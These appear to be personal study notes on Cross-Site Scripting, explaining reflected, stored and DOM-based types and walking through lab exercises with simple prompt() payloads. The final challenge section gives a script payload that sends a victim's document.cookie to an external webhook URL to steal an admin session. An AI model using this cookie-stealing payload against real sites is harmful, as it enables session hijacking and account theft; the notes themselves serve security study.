**==It allows use to execute javascript code in the browser of the victim.==**

<mark style="background: #FF5582A6;">Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal sensitive information, manipulate the web page’s behavior, or perform actions on behalf of the user without their knowledge.</mark>

It is split in:
1. `reflected`, when we send data to a request (javascript code) to the server and it replies with this data we sent
	1. ![[Pasted image 20250104155943.png]]
2. `Stored`, when the data is stored in the server and then served to other victims
	1. ![[Pasted image 20250104160016.png]]
3. `DOM-Based`, when it happens locally in the browser without any interaction with the server (we change the html document without intercting with the server). It this case the page uses vulnerable javascript that gets untrusted input.
	1. ![[Pasted image 20250104160114.png]]


**==In general== `alert()` ==is used but now chrome blocks it so we prefer to use== `print()` or `prompt("hello")`**
- ![[Pasted image 20250104160443.png]]


# DOM lab xss 0x01
We want to inject the add item  functionality:
- ![[Pasted image 20250104160602.png]]

If we look with the inspect of th browser we can see that what we put in input is injected into the html dom:
- ![[Pasted image 20250104160707.png]]
	- no request are generated when we add items

So we try a basilar input:
```javascript
<img src=x onerror="prompt(1)">
```
- ![[Pasted image 20250104160845.png]]

# Stored lab xss 0x02
One thing to see it work is to use firefox containers that allows to use different users on the same browser and different tabs:
- we have to add the extension `firefox multi-account containers`
- ![[Pasted image 20250104161252.png]]

So now we can use different contianers:
- ![[Pasted image 20250104161429.png]]

At this point we can start to inject.

We can see that we can post a comment:
- ![[Pasted image 20250104161503.png]]


So we try to use:
```javascript
<script> prompt(1)</script>
```
- ![[Pasted image 20250104161623.png]]

Since it is served from the server to other clients we have a stored xss.


# XSS challenge

The idea is to steal the admin cookie sending tickets.
We want to force the admin to send to our url the cookie.

To do it we want to use the support ticket functionality.

So we can use `webhook.site` in order to get requests.

So what we want to do is to send a xss in the ticket request:
```javascript
<script> var i = new Image; i.src="webhook_URL/?"+document.cookie;</script>
```


This will allow us to get the cookie of who executes the script.

In fact on `webhook` we can see:
- ![[Pasted image 20250104163309.png]]

